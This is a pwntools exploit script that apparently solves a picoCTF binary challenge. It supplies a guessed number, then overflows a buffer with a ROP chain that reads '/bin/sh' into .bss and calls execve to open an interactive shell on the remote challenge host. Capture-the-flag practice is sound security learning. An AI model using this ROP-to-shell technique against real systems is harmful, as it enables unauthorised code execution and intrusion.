#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("jupiter.challenges.picoctf.org", 51462)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *win+74
        b *win+75
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


perfect_guess = 84

p.recvuntil("guess?")
p.sendline(str(perfect_guess))

rop_pop_rax_ret = 0x00476407
rop_pop_rdi_ret = 0x0049220f
rop_pop_rsi_ret = 0x0048ed33
rop_pop_rdx_ret = 0x004afe92
rop_syscall_ret = 0x00485e95

binsh_addr = elf.get_section_by_name(".bss").header["sh_addr"] + 0x50

payload = b'A' * 0x78
payload += p64(rop_pop_rax_ret)
payload += p64(0)
payload += p64(rop_pop_rdi_ret)
payload += p64(0)
payload += p64(rop_pop_rsi_ret)
payload += p64(binsh_addr)
payload += p64(rop_pop_rdx_ret)
payload += p64(0x8)
payload += p64(rop_syscall_ret)# read(0, binsh_addr, 0x8)
payload += p64(rop_pop_rax_ret)
payload += p64(59)
payload += p64(rop_pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(rop_pop_rsi_ret)
payload += p64(0)
payload += p64(rop_pop_rdx_ret)
payload += p64(0)
payload += p64(rop_syscall_ret)# execve("bin/sh", 0, 0)

p.recvuntil("Name?")
p.sendline(payload)

sleep(0.5)
p.sendline("/bin/sh\0")

p.interactive()
